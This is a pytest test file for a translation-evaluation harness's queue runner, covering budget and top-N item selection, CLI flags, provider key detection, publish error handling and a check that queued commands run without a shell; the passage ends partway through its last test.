"""Tests for the queue runner (mt_eval_harness.queue_runner).

Covers top-N / budget selection, the `mt-eval queue` CLI wiring, and
the scripts/run_queue.py wrapper's backwards-compatible surface.

SSOT: The TestSharedSelectionVectors class at the bottom imports
scenarios from shared/queue-selection-vectors.json — the same file
consumed by mcp-server/test/tools.test.js. If you change selection
behavior, update the vectors and both suites must pass.
"""

from __future__ import annotations

import importlib.util
import json
from pathlib import Path

import pytest

from mt_eval_harness.queue_runner import select_items, transmission_plan_marker

SCRIPT = Path(__file__).resolve().parent.parent / "scripts" / "run_queue.py"


def _queue():
    return {"items": [
        {"id": "a", "condition": "naive", "est_cost_usd": 0.01,
         "language_pair": "eng>fao", "model": "m1", "run_command": "true"},
        {"id": "b", "condition": "coached", "est_cost_usd": 0.01,
         "language_pair": "eng>fao", "model": "m1", "run_command": "true"},
        {"id": "c", "condition": "naive", "est_cost_usd": 0.50,
         "language_pair": "nld>dan", "model": "m2", "run_command": "true"},
        {"id": "d", "condition": "naive", "est_cost_usd": None,
         "language_pair": "spa>cat", "model": "m3", "run_command": "true"},
        {"id": "e", "condition": "naive", "est_cost_usd": 0.02,
         "language_pair": "deu>dan", "model": "m1", "run_command": "true"},
    ]}


class TestTransmissionPlanMarker:
    """The confirmation plan surfaces the queue's per-item no-train stamp
    (2026-07-19 residual closure): a donor sees the channel requirement
    before spending. Enforcement itself lives in the child `mt-eval run`
    (transmission_policy) — this is the disclosure layer."""

    def test_unstamped_item_has_no_marker(self):
        assert transmission_plan_marker({"id": "a"}) == ""

    def test_stamped_item_marked_with_policy(self):
        item = {"id": "a", "transmission": {"policy": "no-train"}}
        assert transmission_plan_marker(item) == "  [no-train]"

    def test_malformed_stamp_ignored(self):
        # The queue is network data — a non-dict or policy-less stamp must
        # not crash the plan display.
        assert transmission_plan_marker({"transmission": "garbage"}) == ""
        assert transmission_plan_marker({"transmission": {}}) == ""


class TestSelectItems:
    def test_top_n_skips_coached_by_default(self):
        selected, skipped = select_items(_queue(), top=3)
        assert [i["id"] for i in selected] == ["a", "c", "d"]
        assert ("b", "coached (no --include-coached)") in skipped

    def test_top_n_includes_coached_when_asked(self):
        selected, _ = select_items(_queue(), top=2, include_coached=True)
        assert [i["id"] for i in selected] == ["a", "b"]

    def test_budget_takes_from_top_within_budget(self):
        # $0.10: a (0.01) fits, c (0.50) would exceed, d unknown-cost
        # skipped, e (0.02) still fits — unknown is never treated as free.
        selected, skipped = select_items(_queue(), budget=0.10)
        assert [i["id"] for i in selected] == ["a", "e"]
        reasons = dict(skipped)
        assert reasons["c"] == "would exceed budget"
        assert reasons["d"] == "no cost estimate (budget mode)"

    def test_budget_exact_fit(self):
        selected, _ = select_items(_queue(), budget=0.51)
        assert [i["id"] for i in selected] == ["a", "c"]

    def test_queue_order_is_respected(self):
        # selection never re-sorts: ranking IS the priority model
        selected, _ = select_items(_queue(), top=10)
        ids = [i["id"] for i in selected]
        assert ids == sorted(ids, key=lambda x: ["a", "c", "d", "e"].index(x))

    def test_empty_queue(self):
        selected, skipped = select_items({"items": []}, top=5)
        assert selected == [] and skipped == []


class TestCliWiring:
    """`mt-eval queue` must parse the runner's flags and dispatch."""

    def test_queue_subcommand_parses(self):
        from mt_eval_harness.cli import build_parser

        args = build_parser().parse_args(
            ["queue", "--top", "3", "--dry-run"]
        )
        assert args.command == "queue"
        assert args.top == 3
        assert args.budget is None
        assert args.dry_run is True
        # DB-as-queue (B1): the default queue source is the live DB ("db"),
        # which falls back to the static queue.json blob if unreachable.
        assert args.queue == "db"

    def test_budget_flag_parses(self):
        from mt_eval_harness.cli import build_parser

        args = build_parser().parse_args(["queue", "--budget", "2.50"])
        assert args.budget == pytest.approx(2.50)
        assert args.top is None

    def test_top_and_budget_are_exclusive(self):
        from mt_eval_harness.cli import build_parser

        with pytest.raises(SystemExit):
            build_parser().parse_args(
                ["queue", "--top", "2", "--budget", "1.0"]
            )

    def test_dry_run_executes_nothing(self, tmp_path, capsys):
        from mt_eval_harness.cli import build_parser
        from mt_eval_harness.queue_runner import run_from_args

        qfile = tmp_path / "queue.json"
        import json
        qfile.write_text(json.dumps(_queue()), encoding="utf-8")
        args = build_parser().parse_args(
            ["queue", "--top", "2", "--dry-run", "--queue", str(qfile)]
        )
        assert run_from_args(args) == 0
        out = capsys.readouterr().out
        assert "--dry-run: nothing executed." in out
        assert "eng>fao" in out

    def test_invalid_top_rejected(self, capsys):
        from mt_eval_harness.cli import build_parser
        from mt_eval_harness.queue_runner import run_from_args

        args = build_parser().parse_args(["queue", "--top", "0"])
        assert run_from_args(args) == 2


class TestScriptWrapper:
    """scripts/run_queue.py keeps the documented standalone surface."""

    def test_wrapper_reexports_selection(self):
        spec = importlib.util.spec_from_file_location("run_queue", SCRIPT)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        selected, _ = mod.select_items(_queue(), top=1)
        assert [i["id"] for i in selected] == ["a"]
        assert mod.DEFAULT_QUEUE_URL.startswith("https://")


class TestReportHelpers:
    """Verify _read_report_cost and _read_report_chrf extract correctly."""

    def test_read_cost_from_valid_report(self, tmp_path):
        from mt_eval_harness.queue_runner import _read_report_cost
        import json

        report = {"overall": {"total_cost_usd": 0.0342, "avg_chrf": 62.3}}
        rpath = tmp_path / "run_20260614_report.json"
        rpath.write_text(json.dumps(report), encoding="utf-8")
        assert _read_report_cost(rpath) == pytest.approx(0.0342)

    def test_read_cost_missing_field(self, tmp_path):
        from mt_eval_harness.queue_runner import _read_report_cost
        import json

        report = {"overall": {"avg_chrf": 62.3}}
        rpath = tmp_path / "run_missing_report.json"
        rpath.write_text(json.dumps(report), encoding="utf-8")
        assert _read_report_cost(rpath) == 0.0

    def test_read_cost_invalid_json(self, tmp_path):
        from mt_eval_harness.queue_runner import _read_report_cost

        rpath = tmp_path / "run_bad_report.json"
        rpath.write_text("not json", encoding="utf-8")
        assert _read_report_cost(rpath) == 0.0

    def test_read_cost_nonexistent_file(self, tmp_path):
        from mt_eval_harness.queue_runner import _read_report_cost

        rpath = tmp_path / "nonexistent.json"
        assert _read_report_cost(rpath) == 0.0

    def test_read_chrf_from_valid_report(self, tmp_path):
        from mt_eval_harness.queue_runner import _read_report_chrf
        import json

        report = {"overall": {"avg_chrf": 58.7}}
        rpath = tmp_path / "run_chrf_report.json"
        rpath.write_text(json.dumps(report), encoding="utf-8")
        assert _read_report_chrf(rpath) == pytest.approx(58.7)

    def test_read_chrf_missing(self, tmp_path):
        from mt_eval_harness.queue_runner import _read_report_chrf
        import json

        report = {"overall": {}}
        rpath = tmp_path / "run_nochrf_report.json"
        rpath.write_text(json.dumps(report), encoding="utf-8")
        assert _read_report_chrf(rpath) is None


class TestNoPublishFlag:
    """--no-publish flag parsing and wiring."""

    def test_no_publish_flag_parses(self):
        from mt_eval_harness.cli import build_parser

        args = build_parser().parse_args(
            ["queue", "--top", "3", "--no-publish"]
        )
        assert args.no_publish is True

    def test_no_publish_default_is_false(self):
        from mt_eval_harness.cli import build_parser

        args = build_parser().parse_args(["queue", "--top", "3"])
        assert args.no_publish is False

    def test_dry_run_with_no_publish(self, tmp_path, capsys):
        from mt_eval_harness.cli import build_parser
        from mt_eval_harness.queue_runner import run_from_args
        import json

        qfile = tmp_path / "queue.json"
        qfile.write_text(json.dumps(_queue()), encoding="utf-8")
        args = build_parser().parse_args(
            ["queue", "--budget", "0.10", "--dry-run",
             "--no-publish", "--queue", str(qfile)]
        )
        assert run_from_args(args) == 0
        out = capsys.readouterr().out
        assert "--dry-run: nothing executed." in out


class TestProviderKeyNotice:
    """The queue runner warns when it auto-routes through OpenRouter while a
    direct vendor key is also set — so a contributor isn't surprised that
    anthropic/* models billed OPENROUTER_API_KEY instead of ANTHROPIC_API_KEY."""

    def test_keys_present_reads_process_env(self, monkeypatch):
        from mt_eval_harness.queue_runner import _keys_present

        # Use fake var names so a developer's real .env.local (which the
        # dotenv scan also reads) can't influence the result.
        monkeypatch.setenv("FAKE_PRESENT_KEY_XYZ", "v")
        monkeypatch.delenv("FAKE_ABSENT_KEY_XYZ", raising=False)
        present = _keys_present(["FAKE_PRESENT_KEY_XYZ", "FAKE_ABSENT_KEY_XYZ"])
        assert "FAKE_PRESENT_KEY_XYZ" in present
        assert "FAKE_ABSENT_KEY_XYZ" not in present

    def test_notice_shown_when_auto_openrouter_and_direct_key_set(self, monkeypatch):
        from mt_eval_harness import queue_runner

        # A direct key is set; OpenRouter was auto-detected (not --provider).
        monkeypatch.setattr(queue_runner, "_keys_present",
                            lambda env_vars: ["ANTHROPIC_API_KEY"])
        notice = queue_runner._direct_key_notice(
            provider_explicit=False, provider_name="openrouter")
        assert notice is not None
        assert "ANTHROPIC_API_KEY" in notice
        assert "--provider" in notice

    def test_no_notice_when_provider_explicit(self, monkeypatch):
        from mt_eval_harness import queue_runner

        monkeypatch.setattr(queue_runner, "_keys_present",
                            lambda env_vars: ["ANTHROPIC_API_KEY"])
        assert queue_runner._direct_key_notice(
            provider_explicit=True, provider_name="openrouter") is None

    def test_no_notice_when_no_direct_key(self, monkeypatch):
        from mt_eval_harness import queue_runner

        monkeypatch.setattr(queue_runner, "_keys_present",
                            lambda env_vars: [])
        assert queue_runner._direct_key_notice(
            provider_explicit=False, provider_name="openrouter") is None

    def test_no_notice_for_direct_provider(self, monkeypatch):
        from mt_eval_harness import queue_runner

        # If the user is already on a direct provider, there's nothing to warn.
        monkeypatch.setattr(queue_runner, "_keys_present",
                            lambda env_vars: ["ANTHROPIC_API_KEY"])
        assert queue_runner._direct_key_notice(
            provider_explicit=False, provider_name="anthropic") is None


class TestBudgetGuardDisplay:
    """Budget mode shows the cap and guard warning in the plan output."""

    def test_budget_cap_shown_in_plan(self, tmp_path, capsys):
        from mt_eval_harness.cli import build_parser
        from mt_eval_harness.queue_runner import run_from_args
        import json

        qfile = tmp_path / "queue.json"
        qfile.write_text(json.dumps(_queue()), encoding="utf-8")
        args = build_parser().parse_args(
            ["queue", "--budget", "0.10", "--dry-run", "--queue", str(qfile)]
        )
        run_from_args(args)
        out = capsys.readouterr().out
        # The plan should mention the budget cap
        assert "Budget cap: $0.10" in out
        # Should mention the budget guard behavior
        assert "stop early" in out


class TestSelectItemsBudgetEdgeCases:
    """Additional budget selection edge cases for the no-partial-run guarantee."""

    def test_single_item_exceeds_budget(self):
        """An item that costs more than the entire budget is skipped."""
        queue = {"items": [
            {"id": "x", "condition": "naive", "est_cost_usd": 5.00,
             "language_pair": "eng>fao", "model": "m1", "run_command": "true"},
        ]}
        selected, skipped = select_items(queue, budget=2.00)
        assert selected == []
        assert len(skipped) == 1
        assert skipped[0][1] == "would exceed budget"

    def test_no_partial_selection(self):
        """Items are only selected if they fit ENTIRELY within budget."""
        queue = {"items": [
            {"id": "a", "condition": "naive", "est_cost_usd": 1.50,
             "language_pair": "eng>fao", "model": "m1", "run_command": "true"},
            {"id": "b", "condition": "naive", "est_cost_usd": 1.50,
             "language_pair": "eng>crk", "model": "m1", "run_command": "true"},
        ]}
        # Budget is $2 — only the first item fits (1.50 <= 2.00),
        # the second would push to $3.00 which exceeds.
        selected, skipped = select_items(queue, budget=2.00)
        assert [i["id"] for i in selected] == ["a"]
        assert ("b", "would exceed budget") in skipped

    def test_cheaper_item_after_expensive_one(self):
        """A cheap item after an unaffordable one still gets selected."""
        queue = {"items": [
            {"id": "a", "condition": "naive", "est_cost_usd": 0.10,
             "language_pair": "eng>fao", "model": "m1", "run_command": "true"},
            {"id": "b", "condition": "naive", "est_cost_usd": 5.00,
             "language_pair": "eng>crk", "model": "m1", "run_command": "true"},
            {"id": "c", "condition": "naive", "est_cost_usd": 0.05,
             "language_pair": "deu>dan", "model": "m1", "run_command": "true"},
        ]}
        selected, _ = select_items(queue, budget=0.20)
        # a (0.10) fits, b (5.00) skipped, c (0.05) still fits
        assert [i["id"] for i in selected] == ["a", "c"]


class TestProviderSupport:
    """Multi-provider support: detection, CLI flag, and command injection."""

    def test_provider_key_map_covers_registry(self):
        """PROVIDER_KEY_MAP must have an entry for every registered provider."""
        from mt_eval_harness.queue_runner import PROVIDER_KEY_MAP
        from mt_eval_harness.providers.registry import PROVIDER_REGISTRY
        for name in PROVIDER_REGISTRY:
            assert name in PROVIDER_KEY_MAP, (
                f"Provider '{name}' is in PROVIDER_REGISTRY but not in "
                f"PROVIDER_KEY_MAP — the queue runner can't find its key"
            )

    def test_detect_provider_finds_openrouter(self, monkeypatch):
        from mt_eval_harness.queue_runner import detect_provider
        monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-test")
        assert detect_provider() == "openrouter"

    def test_detect_provider_finds_anthropic(self, monkeypatch):
        from mt_eval_harness.queue_runner import detect_provider
        # Clear all other keys first
        for var in ("OPENROUTER_API_KEY", "OPENAI_API_KEY",
                     "ANTHROPIC_API_KEY", "GOOGLE_API_KEY"):
            monkeypatch.delenv(var, raising=False)
        monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-test")
        assert detect_provider() == "anthropic"

    def test_detect_provider_prefers_openrouter(self, monkeypatch):
        """When multiple keys exist, openrouter wins (it proxies all models)."""
        from mt_eval_harness.queue_runner import detect_provider
        monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-test")
        monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-test")
        assert detect_provider() == "openrouter"

    def test_detect_provider_returns_none_when_empty(self, monkeypatch, tmp_path):
        from mt_eval_harness.queue_runner import detect_provider
        for var in ("OPENROUTER_API_KEY", "OPENAI_API_KEY",
                     "ANTHROPIC_API_KEY", "GOOGLE_API_KEY"):
            monkeypatch.delenv(var, raising=False)
        # Run from an empty dir so dotenv doesn't find the repo's .env.local
        monkeypatch.chdir(tmp_path)
        assert detect_provider() is None

    def test_provider_flag_parses(self):
        from mt_eval_harness.cli import build_parser
        args = build_parser().parse_args(
            ["queue", "--budget", "2", "--provider", "anthropic"]
        )
        assert args.provider == "anthropic"

    def test_provider_flag_default_is_none(self):
        from mt_eval_harness.cli import build_parser
        args = build_parser().parse_args(["queue", "--budget", "2"])
        assert args.provider is None

    def test_invalid_provider_rejected(self):
        from mt_eval_harness.cli import build_parser
        with pytest.raises(SystemExit):
            build_parser().parse_args(
                ["queue", "--budget", "2", "--provider", "deepl"]
            )


class TestExtractErrorHint:
    """_extract_error_hint pulls one-liners from noisy subprocess output."""

    def test_empty_output(self):
        from mt_eval_harness.queue_runner import _extract_error_hint
        assert _extract_error_hint("") == ""

    def test_extracts_clean_cli_error(self):
        from mt_eval_harness.queue_runner import _extract_error_hint
        output = (
            "some setup output\n"
            "  Provider: openrouter\n"
            "\n"
            "  ✗ First batch failed for all 25 entries (HTTP 401: "
            '{"error":{"message":"User not found."}})'
        )
        result = _extract_error_hint(output)
        assert "First batch failed" in result
        assert "HTTP 401" in result

    def test_extracts_runtime_error(self):
        from mt_eval_harness.queue_runner import _extract_error_hint
        output = (
            "Traceback (most recent call last):\n"
            '  File "/path/to/runner.py", line 370, in execute_run\n'
            "    results = await strategy.execute(\n"
            "RuntimeError: First batch failed for all 25 entries "
            "(HTTP 401: bad key)\n"
        )
        result = _extract_error_hint(output)
        assert "First batch failed" in result

    def test_extracts_http_401(self):
        from mt_eval_harness.queue_runner import _extract_error_hint
        output = "blah blah\nHTTP 401: Unauthorized\nmore stuff\n"
        result = _extract_error_hint(output)
        assert "HTTP 401" in result

    def test_skips_traceback_lines(self):
        from mt_eval_harness.queue_runner import _extract_error_hint
        output = (
            'File "/path/to/something.py", line 42\n'
            "    at async something\n"
            "The actual error message\n"
        )
        result = _extract_error_hint(output)
        assert result == "The actual error message"


VECTORS_FILE = (
    Path(__file__).resolve().parent.parent.parent
    / "shared" / "queue-selection-vectors.json"
)


class TestSharedSelectionVectors:
    """Run every scenario from the shared test vectors.

    These vectors are the SSOT contract between the Python select_items
    (canonical) and the JS filterQueue (MCP server port). If a scenario
    fails here, the fix belongs in select_items or in the vectors —
    never silently change the vectors to match a JS-only change.
    """

    @pytest.fixture(scope="class")
    def vectors(self):
        assert VECTORS_FILE.exists(), (
            f"Shared test vectors not found: {VECTORS_FILE}\n"
            "Run from the repo root, or check that shared/ exists."
        )
        return json.loads(VECTORS_FILE.read_text(encoding="utf-8"))

    def test_vectors_file_is_valid(self, vectors):
        """Sanity: the vectors file has the expected structure."""
        assert "items" in vectors
        assert "scenarios" in vectors
        assert len(vectors["scenarios"]) >= 5, "Expected at least 5 scenarios"

    @pytest.mark.parametrize(
        "scenario_index",
        range(10),  # update if you add scenarios
        ids=lambda i: f"scenario_{i}",
    )
    def test_scenario(self, vectors, scenario_index):
        if scenario_index >= len(vectors["scenarios"]):
            pytest.skip("scenario index out of range")

        scenario = vectors["scenarios"][scenario_index]
        items = scenario["override_items"] if "override_items" in scenario else vectors["items"]
        params = scenario["params"]

        queue = {"items": items}
        selected, _ = select_items(
            queue,
            top=params.get("top"),
            budget=params.get("budget"),
            include_coached=params.get("include_coached", False),
        )
        ids = [it["id"] for it in selected]
        assert ids == scenario["expected_ids"], (
            f"Scenario \"{scenario['name']}\": "
            f"expected {scenario['expected_ids']} got {ids}"
        )


# ---------------------------------------------------------------------------
# New tests for the execution-loop improvements (timeout, signal, budget
# guard, sequential auto-detection, --stop-on-failure wiring).
#
# These tests run the full run_from_args path with --no-publish and --yes
# to bypass auth and confirmation. A mock_provider fixture stubs out the
# provider subsystem so no real API calls are made.
# ---------------------------------------------------------------------------


@pytest.fixture
def mock_provider(monkeypatch):
    """Stub provider detection/loading so execution tests skip auth."""
    monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-test-fake")

    class _FakeProvider:
        def load_api_key(self):
            pass

    monkeypatch.setattr(
        "mt_eval_harness.providers.get_provider",
        lambda name: _FakeProvider(),
    )


def _make_queue_file(tmp_path, items):
    """Write a minimal queue.json and return its path."""
    qfile = tmp_path / "queue.json"
    qfile.write_text(json.dumps({"items": items}), encoding="utf-8")
    return str(qfile)


@pytest.fixture
def shell_loop(monkeypatch):
    """Drive the execution loop with each item's ``run_command`` as a real,
    test-controlled shell command (sleep / exit / echo) so the concurrency,
    timeout, budget-guard and circuit-breaker logic can be exercised
    deterministically.

    Production NEVER does this: ``run_from_args`` reconstructs a shell-free
    argv from the item's structured fields via ``build_run_argv`` and runs it
    with ``shell=False``. This fixture deliberately opts into a shell for the
    test's OWN in-repo command string — it does not feed network data to a
    shell. Tests that assert the *security* property (no shell, argv rebuilt
    from structured fields) do NOT use this fixture.
    """
    from mt_eval_harness import queue_runner

    def _shell_argv(item, *, coaching_file=None, provider=None,
                    output_dir=None):
        return ["sh", "-c", item["run_command"]]

    monkeypatch.setattr(queue_runner, "build_run_argv", _shell_argv)


class TestTimeoutFlagParsing:
    """--timeout flag is accepted and parsed correctly."""

    def test_timeout_default(self):
        from mt_eval_harness.cli import build_parser

        args = build_parser().parse_args(["queue", "--budget", "2"])
        assert args.timeout == 300

    def test_timeout_explicit(self):
        from mt_eval_harness.cli import build_parser

        args = build_parser().parse_args(
            ["queue", "--budget", "2", "--timeout", "60"]
        )
        assert args.timeout == 60

    def test_jobs_default_is_none(self):
        from mt_eval_harness.cli import build_parser

        args = build_parser().parse_args(["queue", "--budget", "2"])
        # Default is None (auto-detect sequential vs. concurrent)
        assert args.jobs is None


class TestTimeoutHandling:
    """Per-item timeout kills hung subprocesses and reports them."""

    def test_timeout_kills_hung_item(
        self, tmp_path, mock_provider, shell_loop, capsys
    ):
        from mt_eval_harness.cli import build_parser
        from mt_eval_harness.queue_runner import run_from_args

        qfile = _make_queue_file(tmp_path, [{
            "id": "slow", "condition": "naive", "est_cost_usd": 0.01,
            "language_pair": "eng>xxx", "model": "test/model",
            "run_command": "sleep 60",
        }])
        args = build_parser().parse_args([
            "queue", "--top", "1", "--yes", "--no-publish",
            "--queue", qfile, "--timeout", "2",
        ])
        rc = run_from_args(args)
        out = capsys.readouterr().out
        assert "timed out" in out
        assert rc == 1  # timeout is a non-zero exit


class TestStopOnFailureWiring:
    """--stop-on-failure now actually halts the batch (was a dead flag)."""

    def test_stop_on_failure_halts_batch(
        self, tmp_path, mock_provider, shell_loop, capsys
    ):
        from mt_eval_harness.cli import build_parser
        from mt_eval_harness.queue_runner import run_from_args

        items = [
            {"id": "fail1", "condition": "naive", "est_cost_usd": 0.01,
             "language_pair": "eng>aaa", "model": "m",
             "run_command": "exit 1"},
            {"id": "ok1", "condition": "naive", "est_cost_usd": 0.01,
             "language_pair": "eng>bbb", "model": "m",
             "run_command": "echo ok"},
        ]
        qfile = _make_queue_file(tmp_path, items)
        args = build_parser().parse_args([
            "queue", "--top", "2", "--yes", "--no-publish",
            "--stop-on-failure",
            "--queue", qfile, "--timeout", "5",
        ])
        rc = run_from_args(args)
        out = capsys.readouterr().out
        # The flag should print its halt message
        assert "--stop-on-failure" in out
        # Only 1 item should have run (the failing one) because
        # ≤3 items runs sequentially and first failure halts.
        assert "eng>aaa" in out
        assert rc == 1


class TestSequentialSmallBatch:
    """≤3 items run sequentially by default; --jobs overrides."""

    def test_three_items_run_sequential(
        self, tmp_path, mock_provider, shell_loop, capsys
    ):
        from mt_eval_harness.cli import build_parser
        from mt_eval_harness.queue_runner import run_from_args

        items = [
            {"id": f"i{i}", "condition": "naive", "est_cost_usd": 0.01,
             "language_pair": f"eng>x{i}x", "model": "m",
             "run_command": "true"}
            for i in range(3)
        ]
        qfile = _make_queue_file(tmp_path, items)
        args = build_parser().parse_args([
            "queue", "--top", "3", "--yes", "--no-publish",
            "--queue", qfile, "--timeout", "5",
        ])
        run_from_args(args)
        out = capsys.readouterr().out
        assert "sequential" in out

    def test_jobs_explicit_overrides_sequential(
        self, tmp_path, mock_provider, shell_loop, capsys
    ):
        from mt_eval_harness.cli import build_parser
        from mt_eval_harness.queue_runner import run_from_args

        items = [
            {"id": f"i{i}", "condition": "naive", "est_cost_usd": 0.01,
             "language_pair": f"eng>x{i}x", "model": "m",
             "run_command": "true"}
            for i in range(3)
        ]
        qfile = _make_queue_file(tmp_path, items)
        args = build_parser().parse_args([
            "queue", "--top", "3", "--yes", "--no-publish",
            "--queue", qfile, "--timeout", "5", "--jobs", "4",
        ])
        run_from_args(args)
        out = capsys.readouterr().out
        assert "4 concurrent" in out

    def test_four_items_default_concurrent(
        self, tmp_path, mock_provider, shell_loop, capsys
    ):
        from mt_eval_harness.cli import build_parser
        from mt_eval_harness.queue_runner import run_from_args

        items = [
            {"id": f"i{i}", "condition": "naive", "est_cost_usd": 0.01,
             "language_pair": f"eng>x{i}x", "model": "m",
             "run_command": "true"}
            for i in range(4)
        ]
        qfile = _make_queue_file(tmp_path, items)
        args = build_parser().parse_args([
            "queue", "--top", "4", "--yes", "--no-publish",
            "--queue", qfile, "--timeout", "5",
        ])
        run_from_args(args)
        out = capsys.readouterr().out
        # 4 items → should NOT be sequential
        assert "sequential" not in out
        assert "concurrent" in out


class TestBudgetPreDispatch:
    """Budget guard prevents over-spending during execution.

    select_items() filters by estimated cost during selection. The
    pre-dispatch guard in the execution loop catches the case where
    actual costs (which may differ from estimates) push past the budget.
    We test the full pipeline here: selection + execution.
    """

    def test_budget_guard_shown_in_output(
        self, tmp_path, mock_provider, shell_loop, capsys
    ):
        from mt_eval_harness.cli import build_parser
        from mt_eval_harness.queue_runner import run_from_args

        items = [
            {"id": "cheap", "condition": "naive", "est_cost_usd": 0.02,
             "language_pair": "eng>aaa", "model": "m",
             "run_command": "true"},
        ]
        qfile = _make_queue_file(tmp_path, items)
        args = build_parser().parse_args([
            "queue", "--budget", "0.05", "--yes", "--no-publish",
            "--queue", qfile, "--timeout", "5",
        ])
        rc = run_from_args(args)
        out = capsys.readouterr().out
        # Budget cap is shown in the plan
        assert "Budget cap: $0.05" in out
        # Item ran successfully
        assert "eng>aaa" in out
        assert rc == 0

    def test_select_items_filters_expensive_before_dispatch(self):
        """Items that exceed budget are never dispatched."""
        queue = {"items": [
            {"id": "cheap", "condition": "naive", "est_cost_usd": 0.02,
             "language_pair": "eng>aaa", "model": "m",
             "run_command": "true"},
            {"id": "pricey", "condition": "naive", "est_cost_usd": 0.50,
             "language_pair": "eng>bbb", "model": "m",
             "run_command": "true"},
            {"id": "cheap2", "condition": "naive", "est_cost_usd": 0.02,
             "language_pair": "eng>ccc", "model": "m",
             "run_command": "true"},
        ]}
        selected, skipped = select_items(queue, budget=0.05)
        ids = [i["id"] for i in selected]
        # Expensive item filtered during selection
        assert "pricey" not in ids
        assert "cheap" in ids
        assert "cheap2" in ids
        # Verify reason
        assert ("pricey", "would exceed budget") in skipped


# ---------------------------------------------------------------------------
# Publish-reliability hardening (the curl champollion.dev/run_queue path).
#
# These cover the four failure modes that previously kept the headline
# `--budget 2` flow from reliably publishing:
#   1. child run subprocesses inheriting the tty and hanging on their own
#      publish prompt  → fixed with stdin=DEVNULL
#   2. publish_to_supabase raising SystemExit (4xx / integrity / retries)
#      aborting the whole batch → fixed with _auto_publish swallowing it
#   3. concurrent items cross-matching reports in a shared output dir →
#      fixed with a per-item --output-dir and _find_report_in_dir
#   4. the anonymous intake's per-IP rate limit treated as a terminal
#      per-item failure (2026-07-19 $100 wave: 349 runs, 76 published, 273
#      scattered hints) → fixed with AnonymousRateLimitError + the shared
#      defer gate + ONE end-of-batch re-publish block; see
#      test_publish_rate_limit.py for the full coverage
# ---------------------------------------------------------------------------


class TestAutoPublish:
    """_auto_publish must NEVER let a publish failure escape (except Ctrl+C).

    It returns a PublishOutcome: .ok for success, .rate_limited when the
    anonymous intake's window deferred the publish (covered in depth by
    test_publish_rate_limit.py).
    """

    @pytest.fixture(autouse=True)
    def _open_publish_gate(self):
        """Publish-gate state is module-level — isolate every test."""
        from mt_eval_harness import queue_runner
        queue_runner._reset_publish_gate()
        yield
        queue_runner._reset_publish_gate()

    def test_swallows_systemexit_returns_not_ok(self, monkeypatch, capsys):
        from mt_eval_harness import queue_runner

        def boom(*a, **k):
            raise SystemExit(1)   # what publish does on a 4xx / integrity fail

        monkeypatch.setattr(
            "mt_eval_harness.publish.publish_to_supabase", boom
        )
        outcome = queue_runner._auto_publish("/tmp/x_report.json", "eng>zul")
        assert outcome.ok is False
        assert outcome.rate_limited is False
        out = capsys.readouterr().out
        assert "Publish failed" in out
        # Tells the contributor exactly how to recover their paid run.
        assert "mt-eval publish /tmp/x_report.json" in out

    def test_swallows_generic_exception_returns_not_ok(self, monkeypatch):
        from mt_eval_harness import queue_runner

        def boom(*a, **k):
            raise RuntimeError("network down")

        monkeypatch.setattr(
            "mt_eval_harness.publish.publish_to_supabase", boom
        )
        assert queue_runner._auto_publish("/tmp/x_report.json").ok is False

    def test_ok_on_success(self, monkeypatch):
        from mt_eval_harness import queue_runner
        monkeypatch.setattr(
            "mt_eval_harness.publish.publish_to_supabase",
            lambda *a, **k: {"id": "x"},
        )
        assert queue_runner._auto_publish("/tmp/x_report.json").ok is True

    def test_keyboardinterrupt_propagates(self, monkeypatch):
        """Ctrl+C must still interrupt — it is NOT a publish failure."""
        from mt_eval_harness import queue_runner

        def boom(*a, **k):
            raise KeyboardInterrupt

        monkeypatch.setattr(
            "mt_eval_harness.publish.publish_to_supabase", boom
        )
        with pytest.raises(KeyboardInterrupt):
            queue_runner._auto_publish("/tmp/x_report.json")


class TestFindReportInDir:
    """_find_report_in_dir reads exactly one item's isolated output."""

    def test_missing_dir_returns_none(self, tmp_path):
        from mt_eval_harness.queue_runner import _find_report_in_dir
        assert _find_report_in_dir(tmp_path / "nope") is None

    def test_empty_dir_returns_none(self, tmp_path):
        from mt_eval_harness.queue_runner import _find_report_in_dir
        assert _find_report_in_dir(tmp_path) is None

    def test_finds_the_report(self, tmp_path):
        from mt_eval_harness.queue_runner import _find_report_in_dir
        (tmp_path / "run_123_report.json").write_text("{}", encoding="utf-8")
        found = _find_report_in_dir(tmp_path)
        assert found is not None and found.name == "run_123_report.json"


class TestSubprocessIsolation:
    """Children run shell-free (argv list), with DEVNULL stdin and a unique
    --output-dir. NOTE: deliberately does NOT use the shell_loop seam — it
    asserts the production security property directly."""

    def test_shellfree_argv_devnull_stdin_isolated_output_dir(
        self, tmp_path, mock_provider, monkeypatch
    ):
        from mt_eval_harness import queue_runner
        from mt_eval_harness.cli import build_parser

        # Hermetic: the runner's best-effort coverage skip reads the LIVE
        # board — once real runs exist there (board seeded 2026-07-19), a
        # fixture combo can genuinely be "already published" and the item
        # never dispatches, failing this test for the wrong reason.
        monkeypatch.setenv("MT_EVAL_NO_COVERAGE_SKIP", "1")

        captured = []

        class _FakeProc:
            returncode = 0

            def communicate(self, timeout=None):
                return ("", None)

            def kill(self):
                pass

        def spy(cmd, **kwargs):
            captured.append((cmd, kwargs))
            return _FakeProc()

        monkeypatch.setattr(queue_runner.subprocess, "Popen", spy)

        item = {
            "id": "eng-zul-dev-v1__m__naive", "condition": "naive",
            "est_cost_usd": 0.01, "language_pair": "eng>zul",
            "corpus_id": "eval-eng-zul-tatoeba-dev-v1",
            "model": "anthropic/claude-haiku-4.5",
            "target_language": "Zulu",
            "run_command": "mt-eval run --corpus x.json --model m --yes",
        }
        qfile = _make_queue_file(tmp_path, [item])
        args = build_parser().parse_args([
            "queue", "--top", "1", "--yes", "--no-publish",
            "--queue", qfile, "--timeout", "5",
        ])
        queue_runner.run_from_args(args)

        assert captured, "Popen was never called"
        cmd, kwargs = captured[0]
        # (1) NO shell — the command is an argv list, shell is never enabled
        assert isinstance(cmd, list)
        assert kwargs.get("shell") in (None, False)
        # (2) the argv is reconstructed from STRUCTURED fields, not from the
        #     network-supplied run_command string
        assert cmd[0] == "mt-eval" and cmd[1] == "run"
        assert "--corpus" in cmd
        assert "eval-eng-zul-tatoeba-dev-v1" in cmd  # the corpus_id field
        assert "anthropic/claude-haiku-4.5" in cmd   # the model field
        # (3) the child must not be able to read our terminal
